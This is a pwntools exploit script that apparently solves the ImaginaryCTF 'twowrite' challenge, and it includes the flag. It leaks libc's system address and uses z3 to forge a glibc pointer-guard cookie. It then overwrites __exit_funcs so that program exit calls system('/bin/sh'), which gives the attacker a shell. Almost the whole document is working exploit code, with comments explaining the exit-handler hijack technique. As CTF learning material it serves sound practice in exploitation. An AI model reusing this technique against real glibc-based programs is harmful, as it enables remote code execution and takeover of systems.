# ictf{d0nt_y0u_l0ve_it_when_the_p0inters_demangle_themselves_77a90021e9a8a690}

# overwrite cookie and *__exit_funcs with the cookie
# cookie need to be set such that system = ror(cookie) ^ cookie, which could be found using z3
# read this blog: https://blog.rop.la/en/exploiting/2024/06/11/code-exec-part1-from-exit-to-system.html

# might need to re-run multiple time, sometimes cannot find cookie

# cool stuffs I learned:
# fs segments are behind libc, can be calculated using libc address
# we can overwrite the fs segments (maybe create a problem that needs canary overwrite)

from pwn import *

HOST='twowrite.chal.imaginaryctf.org'
PORT=1337

binpath = b'./vuln_patched'
libcpath = b'./libc.so.6'

context.binary = ELF(binpath)
context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

e = ELF(binpath)
libc = ELF(libcpath)

gdbscript="""
c
"""

io = 0
if args.REMOTE:
  io = remote(HOST, PORT)
elif args.GDB:
  io = process()
  gdb.attach(io, gdbscript=gdbscript)
else:
  io = process()

def rol(val: int, r_bits: int, width: int = 64) -> int:
    """Rotate left"""
    r_bits %= width
    return ((val << r_bits) & ((1 << width) - 1)) | (val >> (width - r_bits))

def ror(val: int, r_bits: int, width: int = 64) -> int:
    """Rotate right"""
    r_bits %= width
    return (val >> r_bits) | ((val << (width - r_bits)) & ((1 << width) - 1))

ptr_demangle = lambda ptr_enc, cookie : ror(ptr_enc, 0x11) ^ cookie 
ptr_mangle = lambda ptr, cookie: rol(ptr ^ cookie, 0x11)

io.recvuntil('system @ 0x')
libc.address = int(io.recvn(12), 16) - libc.sym['system']

print(f'libc.address: {hex(libc.address)}')

cookie_addr = libc.address - 0x74d7aaf00000 + 0x74d7aaefd740 + 0x30
print(f'cookie_addr: {hex(cookie_addr)}')


func_addr = libc.address - 0x74d7aaf00000 + 0x74d7ab112018
system = libc.sym['system']+4

print(f'func_addr: {hex(func_addr)}')

# where will be cookie_addr and func_addr

# cookie = ptr_mangle(system)
# ror(cookie) = cookie ^ system
# system = ror(cookie) & cookie

from z3 import BitVec, Solver, LShR, sat

def ror(x, r, bits=64):
    """Right rotate x by r bits (using z3 BitVec)."""
    return LShR(x, r) | (x << (bits - r))

def find_cookie(system_value, bits=64, rot=0x11):
    cookie = BitVec("cookie", bits)
    s = Solver()
    s.add(system_value == (ror(cookie, rot, bits) ^ cookie))

    if s.check() == sat:
        return s.model()[cookie].as_long()
    return None

cookie = find_cookie(system)
print(f'cookie: {hex(cookie)}')
assert(ptr_mangle(system, cookie) == cookie)

binsh = next(libc.search(b'/bin/sh\x00'))

io.sendlineafter(b'?', str(cookie).encode())
io.sendlineafter(b'?', str(binsh).encode())
io.sendlineafter(b'?', hex(cookie_addr).encode())
io.sendlineafter(b'?', hex(func_addr).encode())

io.interactive()